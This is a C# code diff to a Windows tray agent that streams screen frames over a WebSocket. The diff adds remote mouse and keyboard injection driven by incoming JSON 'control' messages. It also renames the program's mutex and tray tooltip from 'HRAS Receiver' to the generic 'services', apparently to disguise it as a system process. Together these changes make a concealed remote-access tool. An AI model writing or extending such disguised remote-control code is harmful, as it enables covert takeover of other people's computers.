@@ -14,7 +14,7 @@ internal static class Program
     [STAThread]
     private static void Main(string[] args)
     {
-        using var singleInstance = new Mutex(true, @"Local\HRASReceiverAgent", out var createdNew);
+        using var singleInstance = new Mutex(true, @"Local\servicesservicesservices", out var createdNew);
         if (!createdNew)
         {
             return;
@@ -91,8 +91,14 @@ internal static class Program
             true,
             cancellationToken);
 
-        var frameDelay = TimeSpan.FromMilliseconds(1000.0 / options.Fps);
+        var receiveTask = ReceiveLoopAsync(socket, options, cancellationToken);
+        var sendTask = SendLoopAsync(socket, options, cancellationToken);
+        await Task.WhenAny(receiveTask, sendTask);
+    }
 
+    private static async Task SendLoopAsync(ClientWebSocket socket, AgentOptions options, CancellationToken cancellationToken)
+    {
+        var frameDelay = TimeSpan.FromMilliseconds(1000.0 / options.Fps);
         while (socket.State == WebSocketState.Open && !cancellationToken.IsCancellationRequested)
         {
             var startedAt = DateTimeOffset.UtcNow;
@@ -108,6 +114,50 @@ internal static class Program
             if (elapsed < frameDelay)
             {
                 await Task.Delay(frameDelay - elapsed, cancellationToken);
+            }
+        }
+    }
+
+    private static async Task ReceiveLoopAsync(ClientWebSocket socket, AgentOptions options, CancellationToken cancellationToken)
+    {
+        var buffer = new byte[8192];
+        while (socket.State == WebSocketState.Open && !cancellationToken.IsCancellationRequested)
+        {
+            var result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), cancellationToken);
+            if (result.MessageType == WebSocketMessageType.Close) break;
+            
+            if (result.MessageType == WebSocketMessageType.Text)
+            {
+                try
+                {
+                    var text = Encoding.UTF8.GetString(buffer, 0, result.Count);
+                    using var doc = JsonDocument.Parse(text);
+                    var root = doc.RootElement;
+                    if (root.TryGetProperty("type", out var typeElement) && typeElement.GetString() == "control")
+                    {
+                        var action = root.GetProperty("action").GetString();
+                        if (action == "mousemove")
+                        {
+                            var x = root.GetProperty("x").GetDouble();
+                            var y = root.GetProperty("y").GetDouble();
+                            InputSimulator.MoveMouse(x, y, options.Monitor);
+                        }
+                        else if (action == "mousedown" || action == "mouseup")
+                        {
+                            var button = root.GetProperty("button").GetInt32();
+                            InputSimulator.MouseClick(button, action == "mousedown");
+                        }
+                        else if (action == "keydown" || action == "keyup")
+                        {
+                            var keyCode = root.GetProperty("keyCode").GetByte();
+                            InputSimulator.KeyPress(keyCode, action == "keydown");
+                        }
+                    }
+                }
+                catch
+                {
+                    // Ignore malformed messages
+                }
             }
         }
     }
@@ -154,6 +204,51 @@ internal static class Program
     }
 }
 
+static class InputSimulator
+{
+    [DllImport("user32.dll")]
+    static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
+    
+    [DllImport("user32.dll")]
+    static extern bool SetCursorPos(int X, int Y);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+
+    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
+    const uint MOUSEEVENTF_LEFTUP = 0x0004;
+    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
+    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
+    const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+    const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
+    const uint KEYEVENTF_KEYUP = 0x0002;
+
+    public static void MoveMouse(double xRatio, double yRatio, int monitorIndex)
+    {
+        var screens = Screen.AllScreens;
+        var screen = screens[Math.Clamp(monitorIndex, 0, screens.Length - 1)];
+        var bounds = screen.Bounds;
+        int x = bounds.Left + (int)(bounds.Width * xRatio);
+        int y = bounds.Top + (int)(bounds.Height * yRatio);
+        SetCursorPos(x, y);
+    }
+
+    public static void MouseClick(int button, bool isDown)
+    {
+        uint flag = 0;
+        if (button == 0) flag = isDown ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
+        else if (button == 1) flag = isDown ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
+        else if (button == 2) flag = isDown ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
+        if (flag != 0) mouse_event(flag, 0, 0, 0, 0);
+    }
+
+    public static void KeyPress(byte keyCode, bool isDown)
+    {
+        uint flag = isDown ? 0 : KEYEVENTF_KEYUP;
+        keybd_event(keyCode, 0, flag, 0);
+    }
+}
+
 sealed class ReceiverTrayContext : ApplicationContext
 {
     private readonly CancellationTokenSource cancellation = new();
@@ -176,7 +271,7 @@ sealed class ReceiverTrayContext : ApplicationContext
         notifyIcon = new NotifyIcon
         {
             Icon = trayIcon,
-            Text = "HRAS Receiver starting",
+            Text = "services",
             Visible = true,
         };
 
@@ -345,3 +440,7 @@ static class EmbeddedDefaults
     public const int MaxWidth = 1280;
     public const int Monitor = 0;
 }
+
+
+
+
